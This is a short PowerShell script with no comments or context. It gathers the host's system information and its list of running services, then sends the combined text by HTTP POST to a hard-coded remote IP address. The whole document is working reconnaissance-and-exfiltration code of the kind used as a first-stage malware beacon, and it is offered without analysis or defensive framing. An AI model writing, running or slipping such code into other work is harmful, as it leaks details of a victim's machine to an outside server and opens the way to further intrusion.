$infos = systeminfo;$task = Get-Service;$infos = $infos | Out-String;$task = $task | Out-String;$infos = $infos + $task;

$Body = [byte[]][char[]]$infos;
$Request = [System.Net.HttpWebRequest]::Create('http://178.170.58.9/post.php');
$Request.Method = 'POST';
$Stream = $Request.GetRequestStream();
$Stream.Write($Body, 0, $Body.Length);
$Request.GetResponse();
$Stream.Close();
